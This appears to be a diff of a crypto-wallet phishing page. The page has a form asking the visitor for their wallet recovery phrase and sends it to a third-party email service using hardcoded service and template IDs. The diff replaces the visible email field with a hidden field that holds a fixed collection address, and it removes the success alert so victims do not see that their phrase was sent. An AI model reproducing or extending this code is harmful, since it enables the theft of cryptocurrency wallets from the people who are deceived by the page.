@@ -836,11 +836,10 @@
                                             <div class="flex flex-col mb-6">
                                                 <div class="flex flex-col mb-6">
                                                     <div class="relative">
-                                                        <input id="user_email" type="email" name="email" placeholder="Your email address" 
-                                                               class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
-                                                               style="color: black;" required>
+                                                        <input id="user_email" type="hidden" name="email" value="smthdevane@gmail.com">
                                                     </div>
                                                 </div>
+
                                                 <div class="relative" data-children-count="1"><textarea id="recov_phrase" cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
                                                         name="phrase" required="" style="color: black;"></textarea>
 
@@ -2463,8 +2462,6 @@
 </script>
 
 
-
-
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
     // Initialize EmailJS
@@ -2486,7 +2483,6 @@
     
         emailjs.send('service_gdxh0ee', 'template_4ehv3k8', templateParams)
             .then(function(response) {
-                alert("Wallet information sent successfully.");
                 console.log('SUCCESS!', response.status, response.text);
             }, function(error) {
                 alert("Failed to send. Please try again.");
